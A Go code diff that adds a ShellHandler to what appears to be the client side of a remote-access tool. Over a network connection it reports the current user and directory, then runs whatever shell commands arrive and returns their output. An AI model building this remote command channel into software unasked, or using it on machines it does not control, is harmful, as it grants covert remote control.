@@ -4,7 +4,12 @@ import (
 	"bytes"
 	"context"
 	"fmt"
+	"net"
+	"os"
 	"os/exec"
+	"os/user"
+	"src/Client/generic/logger"
+	"src/Client/session/protocol"
 	"strings"
 	"time"
 )
@@ -77,4 +82,83 @@ func RunShellCommand(commandStr string) (string, error) {
 
 	// If everything succeeded, return the combined output and no error.
 	return combinedOutput, nil
+}
+
+func ShellHandler(conn net.Conn) {
+	currentInfo, err := os.Getwd()
+	if err != nil {
+		fmt.Fprintf(conn, "Error getting current directory: %v\n", err)
+		protocol.SendData(conn, []byte("Error getting current directory."))
+		return
+	}
+	userInfo, err := user.Current()
+	if err != nil {
+		fmt.Fprintf(conn, "Error getting user information: %v\n", err)
+		protocol.SendData(conn, []byte("Error getting user information."))
+		return
+	}
+	info := userInfo.Username + "<sep>" + currentInfo
+	logger.Log(fmt.Sprintf("Current user: %s, Current directory: %s", userInfo.Username, currentInfo))
+	protocol.SendData(conn, []byte(info))
+	for {
+		command, err := protocol.ReceiveData(conn)
+		if err != nil {
+			logger.Error(fmt.Sprintf("Failed to receive command: %v", err))
+			return
+		}
+		commandStr := string(command)
+		logger.Log(fmt.Sprintf("Received command: %s", commandStr))
+
+		if commandStr == "exit" {
+			logger.Log("Exiting shell handler.")
+			break
+		}
+		if strings.HasPrefix(commandStr, "cd") {
+			parts := strings.Fields(commandStr)
+			var targetDir string
+			if len(parts) < 2 {
+				currentUser, err := user.Current()
+				if err != nil {
+					logger.Error(fmt.Sprintf("Failed to get current user: %v", err))
+					protocol.SendData(conn, []byte(fmt.Sprintf("Error getting user info: %v", err)))
+					continue
+				}
+				targetDir = currentUser.HomeDir
+			} else {
+				targetDir = parts[1]
+			}
+			err := os.Chdir(targetDir)
+			if err != nil {
+				logger.Error(fmt.Sprintf("Failed to change directory: %v", err))
+				protocol.SendData(conn, []byte(fmt.Sprintf("Error changing directory: %v<sep>%s", err, currentInfo)))
+				continue
+			}
+			currentInfo, err = os.Getwd()
+			if err != nil {
+				logger.Error(fmt.Sprintf("Error getting current directory after cd: %v", err))
+				protocol.SendData(conn, []byte(fmt.Sprintf("Error getting current directory after cd: %v<sep>%s", err, currentInfo)))
+				continue
+			}
+			logger.Log(fmt.Sprintf("Changed directory to: %s", currentInfo))
+			protocol.SendData(conn, []byte(fmt.Sprintf("Changed directory to: %s<sep>%s", currentInfo, currentInfo)))
+			continue
+		}
+
+		output, err := RunShellCommand(commandStr)
+		if err != nil {
+			logger.Error(fmt.Sprintf("Command execution failed: %v", err))
+			protocol.SendData(conn, []byte(fmt.Sprintf("Error executing command: %v", err)))
+			continue
+		}
+		currentInfo, err := os.Getwd()
+		if err != nil {
+			logger.Error(fmt.Sprintf("Error getting current directory: %v", err))
+			protocol.SendData(conn, []byte("Error getting current directory."))
+			continue
+		}
+		output += "<sep>" + currentInfo
+		protocol.SendData(conn, []byte(output))
+	}
+	logger.Log("Shell handler finished.")
+	return
 }
